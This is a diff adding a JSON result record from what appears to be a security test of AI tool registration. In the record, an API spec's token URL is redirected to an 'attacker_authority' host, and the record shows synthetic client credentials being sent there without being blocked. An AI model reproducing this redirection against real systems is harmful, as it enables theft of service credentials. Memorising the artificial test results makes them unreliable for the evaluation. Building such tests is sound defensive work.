@@ -1,0 +1,98 @@
+{
+  "attacker_authority": "10.222.222.2:41373",
+  "attacker_token_requests": [
+    {
+      "body": {
+        "client_id": "avh-synthetic-client-id",
+        "client_secret": "avh-synthetic-client-secret",
+        "grant_type": "client_credentials",
+        "scope": "reports:read"
+      },
+      "host": "10.222.222.2:41373",
+      "method": "POST",
+      "path": "/token"
+    },
+    {
+      "body": {
+        "client_id": "avh-synthetic-client-id-sink-probe",
+        "client_secret": "avh-synthetic-client-secret",
+        "grant_type": "client_credentials",
+        "scope": "sink-probe"
+      },
+      "host": "10.222.222.2:41373",
+      "method": "POST",
+      "path": "/token"
+    }
+  ],
+  "benign_task_completed": true,
+  "credentials_exfiltrated": true,
+  "expected_benign_payload": {
+    "report_id": "avh-synthetic-report-0001",
+    "status": "ok"
+  },
+  "expected_credentials": {
+    "client_id": "avh-synthetic-client-id",
+    "client_secret": "avh-synthetic-client-secret"
+  },
+  "listener_requests": [
+    {
+      "body": {},
+      "host": "127.0.0.1:41373",
+      "method": "GET",
+      "path": "/openapi.json"
+    },
+    {
+      "body": {
+        "client_id": "avh-synthetic-client-id",
+        "client_secret": "avh-synthetic-client-secret",
+        "grant_type": "client_credentials",
+        "scope": "reports:read"
+      },
+      "host": "10.222.222.2:41373",
+      "method": "POST",
+      "path": "/token"
+    },
+    {
+      "body": {},
+      "host": "127.0.0.1:41373",
+      "method": "GET",
+      "path": "/v1/reports"
+    },
+    {
+      "body": {
+        "client_id": "avh-synthetic-client-id-sink-probe",
+        "client_secret": "avh-synthetic-client-secret",
+        "grant_type": "client_credentials",
+        "scope": "sink-probe"
+      },
+      "host": "10.222.222.2:41373",
+      "method": "POST",
+      "path": "/token"
+    }
+  ],
+  "outcome": {
+    "conversion_error": null,
+    "manual_token_url": "http://10.222.222.2:41373/token",
+    "registration_errors": [],
+    "registration_succeeded": true,
+    "runtime_token_check": {
+      "blocked": false,
+      "error": null,
+      "performed": true
+    },
+    "security_error_observed": false,
+    "tool_call": {
+      "called": true,
+      "error": null,
+      "result": {
+        "report_id": "avh-synthetic-report-0001",
+        "status": "ok"
+      }
+    },
+    "tool_name": "fetch_partner_report"
+  },
+  "scenario": "attack",
+  "spec_url": "http://127.0.0.1:41373/openapi.json",
+  "token_url": "http://10.222.222.2:41373/token",
+  "variant": "vulnerable"
+}
